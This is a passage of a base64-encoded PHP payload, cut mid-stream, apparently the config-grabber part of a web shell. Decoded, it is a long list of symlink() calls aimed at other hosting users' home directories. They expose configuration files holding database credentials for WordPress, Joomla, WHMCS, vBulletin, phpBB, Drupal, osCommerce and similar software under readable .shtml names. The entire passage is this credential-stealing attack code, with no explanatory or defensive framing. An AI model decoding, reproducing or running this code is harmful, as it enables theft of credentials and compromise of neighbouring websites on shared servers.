bGljX2h0bWwvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtY21zLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtc2l0ZS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW1haW4uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXdzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXcuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1ob21lLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj5WQnVsbGV0aW4tZm9ydW0uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC92YjMvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNwYW5lbC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnBhbmVsLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0aW5nLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdHMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+emVuY2FydC5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LXNob3Auc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1aQ3Nob3Auc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJHBkb21haW4uJ35+Pm1rLXBvcnRhbGUxLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NtZi9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1zbWYuc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bS5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtcy9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bXMuc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC91cGxvYWQvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dXBsb2FkLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pm1hbGF5LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRlcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xlbnRzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQyLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywkZG9tYWluLid+fj53ZWJjb25maWcuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywkZG9tYWluLid+fj53ZWJjb25maWcyLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhMS5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3N5c3RlbS9zaXN0ZW0ucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWEuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGVzL2RlZmF1bHQvc2V0dGluZ3MucGhwJywkZG9tYWluLid+PkRydXBhbC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvZTEwN19jb25maWcucGhwJywkZG9tYWluLid+PmUxMDcuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2RhdGFzL2NvbmZpZy5waHAnLCRkb21haW4uJ34+U2VkaXRpby5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi1mb3J1bS5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLWZvcnVtLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+T3RoZXIuc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRkb21haW4uJ35+PmludmlzaW8uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywkZG9tYWluLid+fj5CYWxpdGJhbmcuc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudHMuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmJpbGxpbmcuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmJpbGxpbmdzLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+UGhwQkItZm9ydW0uc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9mdW5jdGlvbnMucGhwJywkZG9tYWluLid+fj5waHBiYjMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jcy5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htYy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htYy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCcsJGRvbWFpbi4nfn4+d2htY3MyLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm1hbmdld2htY3Muc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vcmRlci9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+V2htOS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5teXNob3Auc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydHMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+b3Njb21tZXJjZS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+b3Njb21tZXJjZXMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNob3Atc2hvcHBpbmcuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2FsZS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlci5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIyLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Muc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC1iZXRhLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1iZXRhLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53cDEzLXByZXNzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdvcmRwcmVzcy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdvcmRwcmVzcy1iZXRhLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXdzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ldy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Muc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2ViL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13ZWIuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJsb2dzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1ob21lLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXByb3RhbC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj5vcmRwcmVzcy1zaXRlLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1tYWluLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy10ZXN0LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWpvb21sYS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtcHJvdGFsLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb28vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb28uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2Ntcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWNtcy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXNpdGUuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1tYWluLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbmV3cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbmV3LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+VkJ1bGxldGluLWZvcnVtLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52Yi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiMy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY3BhbmVsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jcGFuZWwuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3BhbmVsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5wYW5lbC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdGluZy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQuc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC96ZW5jYXJ0L2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+emVuY2FydC1zaG9wLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNob3AtWkNzaG9wLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvbWtfY29uZi5waHAnLCRwZG9tYWluLid+fj5tay1wb3J0YWxlMS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYuc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zbWYvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtc21mLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW0uc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bXMvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW1zLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvdXBsb2FkL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnVwbG9hZC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbC9jb25maWcucGhwJywkZG9tYWluLid+fj5tYWxheS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsZW50cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50Mi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnMi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYTEuc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJGRvbWFpbi4nfj5EcnVwYWwuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2UxMDdfY29uZmlnLnBocCcsJGRvbWFpbi4nfj5lMTA3LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9kYXRhcy9jb25maWcucGhwJywkZG9tYWluLid+PlNlZGl0aW8uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TU0kucGhwJywkZG9tYWluLid+fj5DTUYtZm9ydW0uc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkIuc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi1mb3J1bS5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk90aGVyLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywkZG9tYWluLid+fj5pbnZpc2lvLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9saWIvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+QmFsaXRiYW5nLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnRzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5zaHRtbCcp